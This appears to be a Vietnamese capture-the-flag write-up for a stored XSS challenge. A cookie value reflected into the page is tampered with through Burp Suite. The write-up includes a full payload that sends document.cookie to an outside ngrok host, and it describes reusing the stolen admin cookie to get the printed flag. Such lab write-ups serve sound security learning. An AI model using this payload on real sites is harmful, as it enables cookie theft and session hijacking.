# XSS - Stored 2
## Solution
Đầu tiên website cho em một form đăng nhập khá quen thuộc như này.

![image](https://user-images.githubusercontent.com/86184794/160962127-213eb0ad-7d50-40a8-9072-81bc986bfea5.png)


Giờ ta thử khai thác challenge bằng cách nhập các đoạn javacript vào các ô input

![image](https://user-images.githubusercontent.com/86184794/160962287-5100114d-9f21-4296-9767-e9492611e1ff.png)

Khi nhập javascript ở ô input trên thì không có gì xuất hiện cả. Còn khi nhập ở ô input dưới thì xuất hiện thông báo dưới website

![image](https://user-images.githubusercontent.com/86184794/160962384-d36105cb-bd2c-4d76-accf-e59069ecef7e.png)

Như vậy thì ta thấy các ô input này đều được cấu hình để làm sạch dữ liệu đầu vào.


![image](https://user-images.githubusercontent.com/86184794/160962614-50469f2d-38ea-4078-b59e-86ddbd5ad7f2.png)


Khi vào source page thì ta thấy các chuỗi inpput của chúng ta nhập vào đều được làm sạch nhưng để ý thì ta thấy class="invite" có thể khai thác vì em đã phát hiện class="invite" này được lưu trong biến status trong cookie của trang web.


![image](https://user-images.githubusercontent.com/86184794/160962936-f4900a66-e4ce-4c11-a350-d595ff0abd16.png)

Như vậy ý tưởng khai thác challenge này là em làm thay đổi biến status này với chuỗi javacript thì sẽ khai thác được.

Giờ em sẽ dùng burp suite để chặn gói tin lại và sửa đổi cookie.

![image](https://user-images.githubusercontent.com/86184794/160963381-1c897791-da32-480d-8355-0f2d4bb50eb0.png)


Cấu hình burp suite chặn gói tin.

![image](https://user-images.githubusercontent.com/86184794/160963438-894ef662-067a-41b9-8801-7dda8824ba49.png)

Ta được cấu trúc gói tin như trên. Giờ em sẽ đi sửa gói status của gói tin trên thành 
```
"><script>document.write("<img src='http://e961-113-161-66-224.ngrok.io/" %2b documment.cookie %2b "'></img>")</script><img src="; lang=fr\r\n<h1>hello</h1>
```

Sau đó forward gói tin và chờ 1 lúc sẽ được kết quả

![image](https://user-images.githubusercontent.com/86184794/160967179-2cc9c2bd-1e6e-4c19-81ae-509ec89716d4.png)


Sau đó đưa admin_cookie vào request admin thì sẽ có được flag

![image](https://user-images.githubusercontent.com/86184794/160967204-fece4f8b-1fe4-441e-8508-3757fb01c1e5.png)
 
 Flag: E5HKEGyCXQVsYaehaqeJs0AfV


